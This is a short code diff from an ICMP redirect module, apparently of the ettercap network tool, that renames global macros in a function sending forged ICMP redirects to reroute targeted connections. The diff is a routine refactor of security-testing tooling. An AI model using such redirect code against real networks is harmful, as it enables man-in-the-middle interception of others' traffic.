@@ -139,7 +139,7 @@ static void icmp_redirect(struct packet_object *po)
       return;
   
    /* redirect only the connection that match the TARGETS */ 
-   EXECUTE(GBL_SNIFF->interesting, po);
+   EXECUTE(EC_GBL_SNIFF->interesting, po);
    
    /* the packet is not interesting */
    if ( po->flags & PO_IGNORE )
@@ -149,7 +149,7 @@ static void icmp_redirect(struct packet_object *po)
    USER_MSG("%s:%d\n", ip_addr_ntoa(&po->L3.dst, tmp), ntohs(po->L4.dst));
 
    /* send the ICMP redirect */
-   send_icmp_redir(ICMP_REDIRECT_HOST, &i->ip, &GBL_IFACE->ip, po);
+   send_icmp_redir(ICMP_REDIRECT_HOST, &i->ip, &EC_GBL_IFACE->ip, po);
    
 }
 
